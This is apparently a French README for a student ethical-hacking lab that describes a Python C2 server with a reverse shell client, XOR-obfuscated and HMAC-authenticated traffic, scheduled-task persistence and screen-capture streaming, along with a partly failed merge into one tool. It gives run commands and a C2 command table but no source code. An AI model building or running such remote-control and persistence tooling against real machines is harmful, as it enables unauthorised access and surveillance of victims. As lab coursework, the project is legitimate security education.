# TP Ethical Hacking — Sockets TCP en Python

> **Cadre pédagogique :** communication réseau, programmation système et sécurité informatique dans un laboratoire de machines virtuelles.
Equipe : 
Gabriel Bartoux 
LEO Laroche
BIC3 - Spé Cyber
---

## Présentation du projet

Ce projet explore la communication réseau via des sockets TCP en Python, dans un cadre strictement éducatif et isolé (machines virtuelles locales).

L'objectif initial était d'unifier deux projets en seulement deux fichiers. Bien que cette unification n'ait pas abouti à un outil parfaitement stable (problèmes de timeouts et de gestion des threads lors de la fusion), le projet a permis de développer trois modules distincts qui démontrent différentes facettes de l'administration système et de la sécurité réseau.

> [!WARNING]
> L'utilisation de ces scripts est strictement réservée à un laboratoire isolé, sur des machines pour lesquelles vous disposez d'une autorisation explicite. Privilégiez un réseau VirtualBox interne ou « Host-Only ». Le mode « Pont » ne garantit pas l'isolation du laboratoire. Ne collectez aucune donnée personnelle ou confidentielle réelle.

## Sommaire

- [Partie 1 — C2 et Reverse Shell](#partie-1--c2-et-reverse-shell)
- [Partie 2 — Supervision vidéo et persistance](#partie-2--supervision-vidéo-et-persistance)
- [Partie 3 — Tentative d'unification](#partie-3--tentative-dunification)
- [Dépannage](#dépannage-troubleshooting)

---

## Partie 1 — C2 et Reverse Shell

| Fichier | Rôle |
| :--- | :--- |
| `reverse_shell.py` | Client |
| `c2_server.py` | Serveur |

Ce module a été conçu pour établir un shell distant utilisant un mécanisme XOR et une authentification HMAC, et gérer plusieurs machines de test depuis une interface centralisée.

### Fonctionnalités

- Connexion inversée (*Reverse Shell*) initiée par le client.
- Transformation XOR du trafic et authentification par clé secrète (*PSK*).
- Interface interactive multi-clients (`list`, `use`, commandes système).
- Exécution de commandes Windows (via `cmd.exe`, selon l'implémentation) ou Linux.

> [!NOTE]
> Le XOR utilisé dans ce projet ne constitue pas un chiffrement moderne sécurisé. L'authentification HMAC ne suffit pas, à elle seule, à garantir la confidentialité ou l'intégrité de tous les échanges.

### Comment l'utiliser

Sur Kali (serveur), lancez le serveur :

```bash
python3 c2_server.py
```

Sur la machine de test (Windows/Linux), lancez le client avec l'adresse IP de Kali :

```bash
python reverse_shell.py 192.168.x.x 4444 --c2
```

Sur Kali, utilisez l'interface :

| Commande | Description |
| :--- | :--- |
| `list` | Affiche les machines connectées. |
| `use 1` | Sélectionne la machine d'identifiant 1. |
| `whoami` ou `dir` | Exécute une commande sur la machine de test. |

---

## Partie 2 — Supervision vidéo et persistance

| Fichier | Rôle |
| :--- | :--- |
| `client.py` | Client |
| `server.py` | Serveur |

Ce module se concentre sur le démarrage automatique sur la machine de test et la transmission de captures d'écran vers un tableau de bord web.

### Fonctionnalités

- **Persistance :** démarrage automatique du client (tâche planifiée sous Windows, Autostart sous Linux).
- **Commandes restreintes :** le serveur envoie des commandes prédéfinies (`ping`, `hostname`, `system`, `video`, etc.).
- **Dashboard Web :** réception des images via un flux MJPEG accessible depuis un navigateur.
- **Compatibilité multiplateforme :** gestion des dépendances `mss` et `Pillow`.

### Comment l'utiliser

Sur Kali (serveur), lancez le serveur. Le tableau de bord est annoncé comme accessible à l'adresse [http://127.0.0.1:8080](http://127.0.0.1:8080), avec ouverture automatique du navigateur :

```bash
python3 server.py
```

Sur la machine de test, exécutez le client avec l'adresse IP de Kali :

```bash
python client.py 192.168.x.x
```

Dans le terminal Kali, les commandes suivantes contrôlent la démonstration vidéo, avec le consentement de l'utilisateur de la machine de test :

| Commande | Description |
| :--- | :--- |
| `video` | Déclenche la capture d'écran et l'affichage du flux dans le navigateur. |
| `stopvideo` | Arrête le flux vidéo. |

---

## Partie 3 — Tentative d'unification

| Fichier | Rôle |
| :--- | :--- |
| `client_final.py` | Client unifié |
| `server_final.py` | Serveur unifié |

L'objectif de cette partie était de fusionner la persistance et la vidéo (Partie 2) avec le shell distant utilisant XOR et HMAC (Partie 1), afin de ne conserver que deux fichiers à déployer.

### Ce qui a été réalisé

- Intégration du protocole XOR et du shell distant dans le client persistant.
- Centralisation du dashboard vidéo web et de l'interface de commande C2 dans un seul serveur.
- Gestion de l'encodage `cp1252` afin de limiter les erreurs liées à la sortie des commandes Windows (comme `reg save`).

### Statut — Échec partiel

Bien que le code soit théoriquement complet, cette version unifiée rencontre des instabilités en conditions réelles :

| Problème | Comportement observé |
| :--- | :--- |
| Connexion réseau | Le client perd parfois la connexion (`ConnectionRefusedError` ou coupures de sockets) lors de commandes lourdes ou du lancement simultané de la vidéo. |
| Gestion des threads | Des conflits bloquants apparaissent sous Windows entre le shell C2 et le flux vidéo. |
| Démarrage automatique | La persistance via tâche planifiée (`schtasks`) interfère parfois avec l'exécution manuelle du client. |

### Conclusion technique

Ce module démontre la complexité de fusionner deux architectures réseau distinctes — un protocole de messagerie structuré pour le C2 et un flux continu binaire pour la vidéo — dans un seul processus, sans utiliser de bibliothèques asynchrones avancées telles que `asyncio`.

---

## Dépannage (Troubleshooting)

| Élément | Vérification |
| :--- | :--- |
| Pare-feu | Les ports mentionnés dans le projet sont `4444`, `5000`, `5001` et `8080`. Toute autorisation réseau doit rester limitée au laboratoire. |
| Antivirus | Windows Defender peut détecter les reverse shells. Conservez les protections actives et documentez les alertes obtenues lors des tests. |
| Dépendances | Si `mss` ou `Pillow` sont absents, les scripts sont censés tenter de les installer via `pip`. Vérifiez la disponibilité de Python dans le `PATH` de Windows. |
| Réseau | Vérifiez avec `ip a` (Kali) et `ping` que les deux machines de test communiquent sur leur réseau privé. |

--
La partie Linux a été par Leo
La partie Windows a été fais par gabriel
